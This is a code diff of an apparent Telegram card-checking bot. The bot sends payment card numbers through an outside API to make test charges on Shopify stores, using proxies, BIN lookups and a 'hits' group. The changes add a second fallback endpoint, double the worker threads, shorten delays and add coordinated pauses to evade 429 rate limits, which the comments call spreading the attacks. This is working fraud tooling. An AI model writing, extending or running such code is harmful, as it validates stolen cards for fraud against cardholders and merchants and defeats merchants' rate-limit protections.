@@ -84,13 +84,14 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# APIs
-SHOPIFY_API_URL = 'https://autosh.up.railway.app/shopii'
+# APIs (تم ربط المنظومة المزدوجة لتقليل السيرفر إيرور والـ 429)
+SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app/shopii'
+SHOPIFY_API_URL_2 = 'https://autosh.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-WORKERS = 40  
-DELAY = 3.5  
+WORKERS = 80  
+DELAY = 1.0  
 HIT_DELAY = 1.0
 
 _SITE_ERRORS_COUNT = {}
@@ -510,14 +511,18 @@ async def get_bin_info(bin_code, session=None):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-async def check_shopify_api(card, site, proxy, session):
+async def check_shopify_api(api_url, card, site, proxy, session, is_api_2=False):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         proxy_param = f"&proxy={proxy_str}" if proxy else ""
         
         dynamic_price = random.choice([5, 10, 14, 15, 20, 25, 30])
         site_param = site if site.startswith("http") else f"https://{site}"
-        req_url = f"{SHOPIFY_API_URL}?cc={card}&site={site_param}{proxy_param}&amount={dynamic_price}&price={dynamic_price}"
+        
+        if is_api_2:
+            req_url = f"{api_url}?cc={card}&site={site_param}{proxy_param}"
+        else:
+            req_url = f"{api_url}?cc={card}&site={site_param}{proxy_param}&amount={dynamic_price}&price={dynamic_price}"
         
         headers = {"User-Agent": "Mozilla/5.0"}
         async with session.get(req_url, headers=headers, timeout=90) as resp:
@@ -589,14 +594,34 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         if not s:
             return {'status': 'Dead', 'message': 'No Available Sites', 'card': card}
         
-        if gateway_name == "Shopify": r = await check_shopify_api(card, s, p, session)
-        else: return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
-        
-        status = r.get('status')
-        msg = r.get('message', '')
-        msg_lower = str(msg).lower()
+        if gateway_name == "Shopify":
+            # المحاولة الأولى على السيرفر (API 1) الأساسي
+            r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session, is_api_2=False)
             
+            status = r.get('status')
+            msg = r.get('message', '')
+            msg_lower = str(msg).lower()
+            
+            # فلترة ذكية: إذا كان الرد ليس رد مالي صريح، أو يحتوي على أخطاء الـ 429 والـ max ret والـ step 0
+            is_clean = status in ['Charged', 'Approved', 'Insufficient', 'Dead'] and not any(k in msg_lower for k in ['429', 'step 0', 'max ret', 'site dead', 'error', 'tunnel'])
+            
+            if not is_clean:
+                # التحويل التلقائي الذكي فوراً وبنفس اللحظة على الـ API 2 لإنقاذ الفحص وتقليل الـ Server Error
+                r = await check_shopify_api(SHOPIFY_API_URL_2, card, s, p, session, is_api_2=True)
+                status = r.get('status')
+                msg = r.get('message', '')
+                msg_lower = str(msg).lower()
+        else:
+            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
+        
         if status == 'Rate Limit' or '429' in msg_lower:
+            event = get_rate_limit_event()
+            if event.is_set():
+                event.clear()  # تجميد فوري لجميع الخيوط الـ 80 لمنع استمرار الطلبات السيئة
+                async def resume_workers():
+                    await asyncio.sleep(random.uniform(8.0, 15.0))  # منح السيرفر وقت كافي للتنفس وفك الـ IP
+                    event.set()
+                asyncio.create_task(resume_workers())
             await event.wait()  # التأكد من عدم تخطي التجميد إلا بعد فك القفل بالكامل
             await asyncio.sleep(random.uniform(2.0, 4.0))  # تهدئة فردية للخيط لضمان توزيع الهجمات
             lr = r
